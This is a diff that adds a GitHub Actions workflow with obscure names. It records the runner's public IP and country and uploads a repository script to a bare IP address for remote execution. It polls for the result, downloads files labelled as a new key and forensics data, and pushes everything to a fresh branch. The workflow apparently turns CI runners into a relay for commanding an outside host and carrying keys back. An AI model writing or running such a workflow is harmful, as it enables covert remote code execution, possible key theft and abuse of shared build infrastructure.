@@ -1,0 +1,64 @@
+name: ul7466b
+on:
+  workflow_dispatch:
+    inputs:
+      script:
+        description: "repo script to run over ssh"
+        default: "vantage/gv1.sh"
+      runtag:
+        description: "artifact tag"
+        default: "n1"
+      tmo:
+        description: "timeout seconds"
+        default: "900"
+permissions:
+  contents: write
+jobs:
+  ex:
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+    steps:
+      - uses: actions/checkout@v4
+      - name: egress
+        run: |
+          curl -s -m 10 https://api.ipify.org; echo
+      - name: exec
+        env:
+          TAG: ${{ inputs.runtag }}
+        run: |
+          set +e
+          mkdir -p vantage/gv5817
+          H=123.184.7.135
+          L="vantage/gv5817/${TAG}.log"
+          { echo "=== RUNID ${{ github.run_id }} TAG $TAG $(date -u +%FT%TZ)"
+            echo "EGRESS $(curl -s -m 10 https://api.ipify.org) $(curl -s -m 10 https://ipinfo.io/country)"
+            echo "== INDEX"; curl -s -m 12 -w '\nIDXCODE=%{http_code}\n' "http://$H:8099/" | head -60
+            echo "== PUT"; curl -s -m 25 -X POST --data-binary @vantage/ul7466_p1.sh -w '\nPUTCODE=%{http_code}\n' "http://$H:8099/put/run.sh"
+            echo "== POLL"
+            for i in $(seq 1 24); do
+              sleep 15
+              B=$(curl -s -m 12 "http://$H:8099/ul7466_p1.txt" 2>/dev/null)
+              echo "poll $i bytes=${#B}"
+              case "$B" in *DONE7466*) printf '%s\n' "$B" > /tmp/p1.txt; echo "GOTP1 poll=$i"; break;; esac
+            done
+            echo "== P1"; cat /tmp/p1.txt 2>/dev/null
+            echo "== NEWKEY"; curl -s -m 12 "http://$H:8099/ul7466_newkey.b64" | head -c 2500; echo
+            echo "== FORE"; curl -s -m 25 -o /tmp/f.b64 -w 'fore=%{http_code} sz=%{size_download}\n' "http://$H:8099/ul7466_forensics.b64"
+            echo "== OUTTAIL"; curl -s -m 12 "http://$H:8099/out.txt" | tail -c 1500
+          } > "$L" 2>&1
+          cat "$L"
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: gv5817
+          path: vantage/gv5817/
+          if-no-files-found: warn
+      - name: publish
+        if: always()
+        run: |
+          set +e
+          git config user.email bot@ul.local; git config user.name ul
+          git checkout -b gv5817/${{ github.run_id }}
+          git add -f vantage/gv5817/
+          git commit -m "ul7466b ${{ github.run_id }} ${{ inputs.runtag }}"
+          git push -q origin HEAD:gv5817/${{ github.run_id }}
